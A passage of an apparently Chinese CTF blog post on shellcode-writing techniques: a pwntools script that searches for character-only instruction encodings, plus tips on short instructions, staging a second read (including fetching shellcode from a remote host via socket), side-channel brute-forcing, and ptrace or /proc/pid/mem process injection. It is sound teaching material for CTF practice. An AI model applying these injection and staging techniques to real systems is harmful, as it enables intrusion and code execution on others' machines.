+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;0123456789</span><span class="se">\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">disasm</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">y</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">need_p</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">kk</span> <span class="ow">in</span>  <span class="p">(</span><span class="s2">&#34;.byte&#34;</span><span class="p">,</span> <span class="s2">&#34;rex&#34;</span><span class="p">,</span> <span class="s2">&#34;ds&#34;</span><span class="p">,</span> <span class="s2">&#34;bad&#34;</span><span class="p">,</span> <span class="s2">&#34;ss&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">kk</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">need_p</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">need_p</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后根据需要进行组合即可。</p>
+<p>字符型的<code>shellcode</code>要善于使用<code>xor</code>和<code>add</code>，善于借助已有的地址：</p>
+<ul>
+<li><code>0000</code>对应的是<code>add [rax], al</code>，借助溢出可以构造出任意的单字符出来</li>
+<li><code>\x35XXXX</code>，对应的是<code>xor eax, XXXX</code></li>
+<li><code>\x34X</code>，对应的是<code>xor al, X</code></li>
+<li><code>\x31\x31</code>对应的是<code>xor [rax], esi</code></li>
+<li>&hellip;&hellip;</li>
+</ul>
+<h2 class="heading-element" id="4-shellcode编写技巧"><span>4-Shellcode编写技巧</span>
+  <a href="#4-shellcode%e7%bc%96%e5%86%99%e6%8a%80%e5%b7%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>总结一下其他的<code>shellcode</code>编写技巧。</p>
+<h2 class="heading-element" id="4-1-观察寄存器状态"><span>4-1 观察寄存器状态</span>
+  <a href="#4-1-%e8%a7%82%e5%af%9f%e5%af%84%e5%ad%98%e5%99%a8%e7%8a%b6%e6%80%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>最后执行<code>shellcode</code>的指令大概率是<code>call/jmp</code>等，用<code>gdb</code>调试的时候，在此处下个断点，观察寄存器的值。</p>
+<p>一般来说寄存器会残留一些与程序相关的地址、变量等，合理的利用寄存器的值可以有效地减小<code>shellcode</code>的长度。</p>
+<h2 class="heading-element" id="4-2-观察栈的状态"><span>4-2 观察栈的状态</span>
+  <a href="#4-2-%e8%a7%82%e5%af%9f%e6%a0%88%e7%9a%84%e7%8a%b6%e6%80%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>与观察寄存器的值是一样的，观察一下栈上有没有可以利用的地址或者变量。因为<code>pop/push reg</code>，一般是一个字节，非常的短。</p>
+<h2 class="heading-element" id="4-3-使用更短的指令"><span>4-3 使用更短的指令</span>
+  <a href="#4-3-%e4%bd%bf%e7%94%a8%e6%9b%b4%e7%9f%ad%e7%9a%84%e6%8c%87%e4%bb%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>要把<code>rax</code>清零，可以使用的指令有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">;6A0058
+</span></span><span class="line"><span class="cl">push 0
+</span></span><span class="line"><span class="cl">pop rax
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">; 5358 假设rbx为0
+</span></span><span class="line"><span class="cl">push rbx
+</span></span><span class="line"><span class="cl">pop rax
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">;48C7C000000000
+</span></span><span class="line"><span class="cl">mov rax, 0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">; B800000000
+</span></span><span class="line"><span class="cl">mov eax, 0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">;31C0
+</span></span><span class="line"><span class="cl">xor eax, eax
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">; 4893 假设rbx为0
+</span></span><span class="line"><span class="cl">xchg rax, rbx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">;93 假设ebx为0
+</span></span><span class="line"><span class="cl">xchg eax, ebx</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以发现，这些指令的长度都不一样，那么我们应该结合当时的上下文环境选用最短的指令，指令越短，自由度越高。</p>
+<p>怎么编写较短的指令，需要多积累多总结，比如：</p>
+<ul>
+<li>尽量使用<code>pop/push</code></li>
+<li>尽量使用<code>xor reg reg</code></li>
+<li>尽量使用<code>xchg</code></li>
+<li>使用<code>cdq</code>将<code>edx</code>置零</li>
+<li>······</li>
+</ul>
+<h2 class="heading-element" id="4-4-构造read再次读入"><span>4-4 构造read再次读入</span>
+  <a href="#4-4-%e6%9e%84%e9%80%a0read%e5%86%8d%e6%ac%a1%e8%af%bb%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>很多时候由于第一次输入的<code>shellcode</code>长度受限，可以构造出<code>read</code>再输入一次<code>shellcode</code>，构造的方式有：</p>
+<ul>
+<li>直接构造<code>read(0, data, len)</code></li>
+<li>构造<code>socket+connnect+recv</code>从远程读<code>shellcode</code></li>
+<li>构造从文件读<code>shellcode</code></li>
+<li>······</li>
+</ul>
+<h2 class="heading-element" id="4-5-侧信道爆破内存"><span>4-5 侧信道爆破内存</span>
+  <a href="#4-5-%e4%be%a7%e4%bf%a1%e9%81%93%e7%88%86%e7%a0%b4%e5%86%85%e5%ad%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>有时候不知道哪个内存是可读可写的，那么可以使用系统调用爆破内存。比如：</p>
+<ul>
+<li>read</li>
+<li>write</li>
+<li>nanosleep</li>
+<li>mprotect</li>
+<li>&hellip;&hellip;</li>
+</ul>
+<p>这些系统调用，如果猜测的内存为非法地址，则系统调用会失败，然后返回负数，那么可以根据系统调用的返回值来判断是否内存爆破成功。</p>
+<h2 class="heading-element" id="4-6-侧信道爆破flag"><span>4-6 侧信道爆破flag</span>
+  <a href="#4-6-%e4%be%a7%e4%bf%a1%e9%81%93%e7%88%86%e7%a0%b4flag" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>有时候<code>1/2</code>输出流被关闭了，又无法使用<code>socket</code>，就可以使用侧信道的当时来爆破。主要有几种方式：</p>
+<ul>
+<li>使用<code>cmp</code>，如果判断正确，陷入循环或者<code>read</code>等，如果判断错误，触发异常</li>
+<li>使用<code>alarm</code>，使用多线程的方式猜测每个字符（有时候不是很准）</li>
+<li>使用<code>mmap</code>，在内存的末位存入字符，通过异常判断是否猜测正确</li>
+<li>······</li>
+</ul>
+<h2 class="heading-element" id="4-7-借助rax寄存器"><span>4-7 借助rax寄存器</span>
+  <a href="#4-7-%e5%80%9f%e5%8a%a9rax%e5%af%84%e5%ad%98%e5%99%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>rax</code>寄存器存储系统调用号，也存储返回值。主要有两种方式:</p>
+<ul>
+<li>上面提到的根据系统调用的返回值爆破内存等</li>
+<li>利用<code>read</code>等返回值构造系统调用号</li>
+</ul>
+<h2 class="heading-element" id="4-8-借助段寄存器"><span>4-8 借助段寄存器</span>
+  <a href="#4-8-%e5%80%9f%e5%8a%a9%e6%ae%b5%e5%af%84%e5%ad%98%e5%99%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>段寄存器可以拿到代码段、堆、栈等地址，如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mov rbx, ds:[0x30]</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还可以借助<code>load effective address</code>指令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lea rsp, [rip]</span></span></code></pre></td></tr></table>
+</div>
+</div><p>适用于<code>rsp</code>为异常值但需要栈的情况。</p>
+<h2 class="heading-element" id="4-9-ptrace注入"><span>4-9 Ptrace注入</span>
+  <a href="#4-9-ptrace%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>ptrace</code>注入非常强大可以使用<code>ptrace(attach, pid...)</code>读写其他进程的<code>reg</code>或者<code>data</code>区域的内存内容，详细的技巧可以访问<a href="https://man7.org/linux/man-pages/man2/ptrace.2.html"target="_blank" rel="external nofollow noopener noreferrer">ptrace(2) - Linux manual page (man7.org)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>进行学习。</p>
+<p>除此之外，还可以用<code>lseek</code>和<code>open/read/write</code>文件<code>/proc/pid/mem</code>，进而可以直接读写与修改某个进程的虚拟空间内存内容。</p>
+<p>由于代码逻辑会比较复杂，推荐使用<code>tiny_libc</code>直接写<code>C</code>语言，之后剥离出<code>shellcode</code>。</p>
+<h2 class="heading-element" id="4-10-多架构通用shellcode"><span>4-10 多架构通用shellcode</span>
+  <a href="#4-10-%e5%a4%9a%e6%9e%b6%e6%9e%84%e9%80%9a%e7%94%a8shellcode" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>指一段<code>shellcode</code>可以同时在<code>x86/x64/arm/arm64/mips</code>等架构上运行。可以阅读下面的博客：</p>
+<ul>
+<li>
+<p><a href="https://github.com/ixty/xarch_shellcode"target="_blank" rel="external nofollow noopener noreferrer">ixty/xarch_shellcode: Cross Architecture Shellcode in C (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</li>
+<li>
+<p><a href="https://tcode2k16.github.io/blog/posts/2019-04-08-midnightsunctf-polyshell-writeup/"target="_blank" rel="external nofollow noopener noreferrer">Midnightsun CTF 2019 Polyshell Writeup · Alan&rsquo;s Blog (tcode2k16.github.io)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</li>
+</ul>
+<p>主要思想是借助各个架构下的<code>jmp</code>指令：<code>A</code>的<code>jmp</code>是<code>B</code>的<code>nop</code>。就可以把<code>A/B</code>的<code>shellcode</code>放在一起了。</p>
+<h2 class="heading-element" id="4-11-有限字符的shellcode"><span>4-11 有限字符的shellcode</span>
+  <a href="#4-11-%e6%9c%89%e9%99%90%e5%ad%97%e7%ac%a6%e7%9a%84shellcode" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>其实是一种<code>shellcode</code>的编码技巧，比如只用三个字符编码<code>shellcode</code>: <a href="https://www.anquanke.com/post/id/256530#h2-1"target="_blank" rel="external nofollow noopener noreferrer">仅用三种字符实现 x86_64 架构的任意 shellcode-安全客 - 安全资讯平台 (anquanke.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
+<p>步骤仍然是：</p>
+<ul>
+<li>找出各字符组合后可能的<code>shellcode</code>片段</li>
+<li>根据已有的片段、上下文环境编码目标<code>shellcode</code></li>
+</ul>
+<h2 class="heading-element" id="4-12-寄存器全为0的syscall"><span>4-12 寄存器全为0的syscall</span>
+  <a href="#4-12-%e5%af%84%e5%ad%98%e5%99%a8%e5%85%a8%e4%b8%ba0%e7%9a%84syscall" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>一个没啥用的冷知识：当寄存器都是<code>0</code>的时候执行<code>syscall</code>，<code>rcx</code>会被赋值。</p>
+<h2 class="heading-element" id="参考"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li><a href="https://www.yuque.com/cyberangel/rg9gdm/ysgvc4"target="_blank" rel="external nofollow noopener noreferrer">PWN进阶（1-3）-shellcode变形的艺术（x86和x64的转换机制：retfq） (yuque.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></li>
+<li><a href="https://www.anquanke.com/post/id/256530#h2-1"target="_blank" rel="external nofollow noopener noreferrer">仅用三种字符实现 x86_64 架构的任意 shellcode-安全客 - 安全资讯平台 (anquanke.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></li>
+<li><a href="https://www.freebuf.com/articles/system/232280.html"target="_blank" rel="external nofollow noopener noreferrer">Alphanumeric Shellcode：纯字符Shellcode生成指南 - FreeBuf网络安全行业门户<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></li>
+</ul></div><hr class="awesome-hr" />
+    <h2 id="see-also">相关内容</h2>
+    <ul><li>
+          <a href="/zh-cn/2022-06-18-glibcheap-house-of-muney/" title="GlibcHeap-House of Muney">GlibcHeap-House of Muney</a></li><li>
+          <a href="/zh-cn/2023-02-13-%E4%BD%BF%E7%94%A8docker%E8%B0%83%E8%AF%95pwn%E9%A2%98/" title="使用docker调试和部署pwn题">使用docker调试和部署pwn题</a></li><li>
+          <a href="/zh-cn/2023-02-10-socat%E5%8F%8D%E5%BC%B9shell-tmux%E5%85%B1%E4%BA%AB%E4%BC%9A%E8%AF%9D/" title="Socat反弹shell&#43;tmux共享会话">Socat反弹shell&#43;tmux共享会话</a></li><li>
+          <a href="/zh-cn/2023-02-10-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/" title="Pwn环境搭建脚本">Pwn环境搭建脚本</a></li><li>
+          <a href="/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/" title="2023西湖论剑初赛pwn-Jit">2023西湖论剑初赛pwn-Jit</a></li></ul><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-02-20 22:51:44">更新于 2023-02-20&nbsp;</span>
+      </div><div class="post-info-license">
